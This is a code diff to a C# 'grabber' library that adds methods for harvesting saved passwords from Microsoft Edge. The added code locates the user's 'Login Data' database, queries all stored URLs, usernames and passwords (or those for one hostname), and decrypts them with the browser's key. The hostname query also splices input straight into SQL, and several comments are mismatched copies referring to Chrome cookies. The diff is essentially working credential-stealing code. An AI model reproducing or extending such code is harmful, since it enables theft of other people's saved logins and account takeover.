@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json.Linq;
+using CockyGrabber.Classes;
+using Newtonsoft.Json.Linq;
 using Org.BouncyCastle.Crypto;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
@@ -21,6 +22,7 @@ namespace CockyGrabber
     public class EdgeGrabber
     {
         public string EdgeBrowserCookiePath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Default\Cookies";
+        public string EdgeBrowserPasswordsPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data";
 
         public string EdgeKeyPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Local State";
 
@@ -42,6 +44,76 @@ namespace CockyGrabber
         public bool KeyExists()
         {
             if (File.Exists(EdgeKeyPath))
+                return true;
+            return false;
+        }
+
+
+        public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
+        {
+            List<Passwords> password = new List<Passwords>();
+            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
+            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", EdgeBrowserPasswordsPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+
+            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserPasswordsPath};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins WHERE origin_url = '{hostName}'";
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        password.Add(new Passwords()
+                        {
+                            url = reader.GetString(0),
+                            password = DecryptWithKey((byte[])reader[2], key, 3),
+                            username = reader.GetString(1)
+                        });
+                    }
+                }
+                conn.Close();
+            }
+            return password;
+        }
+        public List<Passwords> GetAllPasswords(byte[] key)
+        {
+            List<Passwords> password = new List<Passwords>();
+            if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", EdgeBrowserPasswordsPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found
+
+            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserPasswordsPath};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        password.Add(new Passwords()
+                        {
+                            url = reader.GetString(0),
+                            password = DecryptWithKey((byte[])reader[2], key, 3),
+                            username = reader.GetString(1)
+                        });
+                    }
+                }
+                conn.Close();
+            }
+            return password;
+        }
+
+
+
+        /// <summary>
+        /// Returns a value depending on if the File "Login Data" was found
+        /// </summary>
+        /// <returns>true if Cookies was found and false if not</returns>
+        public bool PasswordsExists()
+        {
+            if (File.Exists(EdgeBrowserPasswordsPath))
                 return true;
             return false;
         }
